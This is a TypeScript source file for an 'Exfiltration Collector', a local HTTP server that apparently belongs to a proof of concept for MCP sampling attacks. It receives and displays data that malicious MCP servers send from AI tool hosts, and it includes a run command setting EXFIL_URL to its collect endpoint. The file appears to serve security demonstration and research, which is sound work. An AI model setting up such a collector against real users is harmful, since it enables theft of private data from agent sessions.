/**
 * Exfiltration Collector — demo endpoint for MCP exfil PoC
 * 
 * Receives stolen data from malicious MCP servers and displays
 * it on a dashboard. For demonstration purposes only.
 * 
 * POST /collect — receives exfiltrated data
 * GET  /        — dashboard showing captured data
 * GET  /data    — raw JSON of all captures
 * POST /reset   — clear captured data
 */
import { createServer, IncomingMessage, ServerResponse } from 'node:http';

interface Capture {
  id: number;
  timestamp: string;
  source: string;
  query?: string;
  dataPreview: string;
  fullData: any;
  byteSize: number;
}

const captures: Capture[] = [];
let nextId = 1;

const PORT = 3001;

function cors(res: ServerResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

async function readBody(req: IncomingMessage): Promise<string> {
  const chunks: Buffer[] = [];
  for await (const chunk of req) chunks.push(chunk as Buffer);
  return Buffer.concat(chunks).toString('utf-8');
}

function dashboard(): string {
  const rows = captures.map(c => `
    <tr>
      <td>${c.id}</td>
      <td>${c.timestamp}</td>
      <td>${c.source}</td>
      <td>${c.byteSize.toLocaleString()} bytes</td>
      <td><pre style="max-height:200px;overflow:auto;font-size:0.75rem;white-space:pre-wrap;margin:0">${esc(c.dataPreview)}</pre></td>
    </tr>`).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>MCP Exfiltration Collector — Clawdrey Hepburn</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:#0a0a0f; color:#e4e4e7; font-family:-apple-system,sans-serif; padding:2rem; }
  h1 { color:#f85149; margin-bottom:0.5rem; }
  .subtitle { color:#71717a; margin-bottom:2rem; font-size:0.9rem; }
  .stats { display:flex; gap:2rem; margin-bottom:2rem; }
  .stat { background:#161b22; border:1px solid #27272a; border-radius:8px; padding:1rem 1.5rem; }
  .stat-num { font-size:2rem; font-weight:700; color:#f85149; }
  .stat-label { font-size:0.8rem; color:#71717a; }
  table { width:100%; border-collapse:collapse; margin-top:1rem; }
  th { text-align:left; color:#71717a; font-size:0.75rem; text-transform:uppercase; letter-spacing:0.05em; padding:0.5rem; border-bottom:1px solid #27272a; }
  td { padding:0.75rem 0.5rem; border-bottom:1px solid #1a1a2e; vertical-align:top; font-size:0.85rem; }
  pre { background:#0d1117; padding:0.5rem; border-radius:4px; color:#f0abfc; }
  .empty { text-align:center; color:#52525b; padding:3rem; font-style:italic; }
  .badge { display:inline-block; background:rgba(248,81,73,0.1); border:1px solid rgba(248,81,73,0.3); color:#f85149; padding:0.15rem 0.5rem; border-radius:1rem; font-size:0.75rem; }
  .refresh { color:#71717a; text-decoration:none; font-size:0.85rem; }
  .refresh:hover { color:#e4e4e7; }
  .header { display:flex; justify-content:space-between; align-items:center; }
  .warning { background:rgba(248,81,73,0.05); border:1px solid rgba(248,81,73,0.2); border-radius:8px; padding:1rem; margin-bottom:2rem; color:#fca5a5; font-size:0.85rem; }
</style>
</head>
<body>
  <div class="header">
    <div>
      <h1>🦞 Exfiltration Collector</h1>
      <p class="subtitle">MCP sampling attack demonstration — clawdreyhepburn/mcp-exfil-poc</p>
    </div>
    <a href="/" class="refresh">↻ Refresh</a>
  </div>
  <div class="warning">⚠️ DEMONSTRATION ONLY — This collector receives data from the MCP exfiltration PoC. All data shown here is simulated. No real credentials or personal data are collected.</div>
  <div class="stats">
    <div class="stat">
      <div class="stat-num">${captures.length}</div>
      <div class="stat-label">Captures</div>
    </div>
    <div class="stat">
      <div class="stat-num">${captures.reduce((a, c) => a + c.byteSize, 0).toLocaleString()}</div>
      <div class="stat-label">Bytes exfiltrated</div>
    </div>
    <div class="stat">
      <div class="stat-num">${new Set(captures.map(c => c.source)).size}</div>
      <div class="stat-label">Unique sources</div>
    </div>
  </div>
  ${captures.length === 0
    ? '<div class="empty">No captures yet. Run the PoC to send data here.<br><code>EXFIL_URL=http://localhost:3001/collect npx tsx host-simulator-memory-store.ts</code></div>'
    : `<table>
      <tr><th>#</th><th>Time</th><th>Source</th><th>Size</th><th>Data Preview</th></tr>
      ${rows}
    </table>`}
</body>
</html>`;
}

function esc(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

const server = createServer(async (req, res) => {
  cors(res);

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  const url = new URL(req.url || '/', `http://localhost:${PORT}`);

  if (req.method === 'POST' && url.pathname === '/collect') {
    const body = await readBody(req);
    let parsed: any;
    try { parsed = JSON.parse(body); } catch { parsed = body; }

    const preview = typeof parsed === 'string'
      ? parsed.slice(0, 500)
      : JSON.stringify(parsed, null, 2).slice(0, 500);

    const capture: Capture = {
      id: nextId++,
      timestamp: new Date().toISOString(),
      source: (parsed?.source || parsed?.query || req.headers['user-agent'] || 'unknown').toString().slice(0, 100),
      query: parsed?.query,
      dataPreview: preview + (preview.length >= 500 ? '...' : ''),
      fullData: parsed,
      byteSize: Buffer.byteLength(body),
    };

    captures.push(capture);
    console.log(`[CAPTURE #${capture.id}] ${capture.byteSize} bytes from ${capture.source}`);

    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ captured: true, id: capture.id, bytes: capture.byteSize }));
  }

  if (req.method === 'GET' && url.pathname === '/data') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(captures, null, 2));
  }

  if (req.method === 'POST' && url.pathname === '/reset') {
    captures.length = 0;
    nextId = 1;
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ reset: true }));
  }

  if (req.method === 'GET' && (url.pathname === '/' || url.pathname === '/dashboard')) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return res.end(dashboard());
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => {
  console.log(`\n🦞 Exfiltration Collector running at http://localhost:${PORT}`);
  console.log(`   Dashboard: http://localhost:${PORT}/`);
  console.log(`   Collect:   POST http://localhost:${PORT}/collect`);
  console.log(`   Data:      GET  http://localhost:${PORT}/data`);
  console.log(`   Reset:     POST http://localhost:${PORT}/reset\n`);
});
